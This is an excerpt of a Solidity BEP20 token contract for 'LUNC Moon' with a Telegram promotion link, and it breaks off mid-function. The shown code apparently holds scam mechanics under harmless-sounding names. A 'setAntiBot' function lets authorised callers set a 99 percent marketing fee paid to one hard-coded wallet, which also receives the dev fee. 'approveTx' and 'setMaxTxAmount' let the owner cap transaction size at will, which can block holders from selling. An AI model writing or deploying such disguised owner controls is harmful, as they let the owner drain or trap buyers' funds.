...
Telegram: https://t.me/LuncMoonToken
...
abstract contract Auth {
    ...
    function updateWalletMarketing(address adr) public onlyOwner {
...
contract LUNCMoon is IBEP20, Auth {
    ...
    string constant _name = " LUNC Moon ";
    string constant _symbol = " $LUNCMOON ";
    ...
    address public marketingFeeReceiver = 0x09B99bFfd8D061a2EC0eF389a1FCe53EB0095Ae9;
    address public devFeeReceiver = 0x09B99bFfd8D061a2EC0eF389a1FCe53EB0095Ae9;
    ...
    function approveTx(uint256 amount) public authorized {
        _maxTxAmount = amount;  
    }

    function setMaxTxAmount(uint256 amountBuy) public onlyOwner {
        _maxTxAmount = amountBuy;
    }

    function setAntiBot() public authorized {
        liquidityFee = 0;
        devFee = 0; 
        marketingFee = 99;
        totalFee = 99;
